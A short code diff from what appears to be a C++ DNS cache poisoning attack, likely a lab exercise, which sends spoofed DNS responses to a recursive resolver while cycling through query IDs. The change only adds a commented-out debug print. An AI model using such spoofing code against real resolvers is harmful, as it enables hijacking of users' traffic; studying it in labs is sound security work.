@@ -64,6 +64,7 @@ int main() {
          */
         IP resp_pkt = IP(RECURSIVE_DNS, AUTHORITATIVE_DNS) / UDP(33333, 53) / dns_response;
         sender.send(resp_pkt);
+	//std::cout << "Trying ID " << query_id << std::endl;
     }
 
     std::cout << "Done trying all possible query IDs, check if the attack has succeded :)" << std::endl;
